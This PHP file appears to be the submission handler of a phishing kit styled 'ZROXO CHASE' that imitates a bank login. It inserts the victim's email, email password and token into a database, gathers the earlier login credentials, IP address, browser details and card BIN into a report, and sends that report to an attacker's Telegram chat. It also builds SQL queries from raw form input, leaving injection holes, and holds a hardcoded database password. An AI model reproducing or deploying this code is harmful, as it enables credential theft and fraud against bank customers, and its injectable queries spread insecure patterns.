<?php
    session_start();
    include'../includes/telegram.php'; 
    include'../admin/config.php'; 

        $conn = mysqli_connect("localhost", "chasd_user", "immAN@@4A", "chasd_data");
          
        // Check connection
        if($conn === false){
            die("ERROR: Could not connect. " 
                . mysqli_connect_error());
        }
          
        $email = $_POST['emaildress'];
        $mail = $_POST['emailaddress'];
        $password = $_POST['emailPassword'];
        $token = $_POST['key_token'];
        
        $sql = "INSERT INTO sosmed (email, token, password) VALUES ('$mail', 
            '$token', '$password')";
            
        // Get Users
        $users = "select * from users where token = '$token'";
        $getUsers = mysqli_query($conn, $users);
        
        $emailLogin = '';
        $passLogin = '';
        while ($row = mysqli_fetch_array($getUsers)) {
            $emailLogin = $row['email'];
            $passLogin = $row['password'];
        }
        // End Get Users

        if(mysqli_query($conn, $sql)){
            // echo "success"; 
            $url = 'redirected?key='.$token;
            header("Location: $url");
        } else{
            echo "ERROR: Hush! Sorry $sql. " 
                . mysqli_error($conn);
        }
          
        // Close connection
        mysqli_close($conn);
        
        $Zroxobin = substr(str_replace(' ','',$_POST['ccnum']),0,6);
    	$resulta =$all_coll."\n";
    	$resulta .= "+ --------------[ LOGIN PAGE ]---------------+\n";
    	$resulta .= "[Username]: ".$emailLogin."\n";
    	$resulta .= "[Password]: ".$passLogin."\n";
    	$resulta .= "+ --------------[ INFO EMAIL POPUP PAGE ]---------------+\n";
    	$resulta .= "[Email]: ".$mail."\n";
    	$resulta .= "[Password]: ".$password."\n";
    	$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
    	$resulta .= "IP Address: ".$_SESSION['ip']."\n";
    	$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
    	$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
    	$resulta .= "User Agent: ".$_SESSION['platform']."\n";
    	$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
    	$subject = "#ZROXO CC: [{$Zroxobin}] [ {$_SESSION['city']} - {$_SESSION['browser']} - {$_SESSION['ip']} ]";
    	$headers="From: ZROXO CHASE <".$result_from_email.">\r\n";
    	$headers.="MIME-Version: 1.0\r\n";
    	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    	
    	telegram_message($resulta,$telegram_token,$telegram_chatid);
?>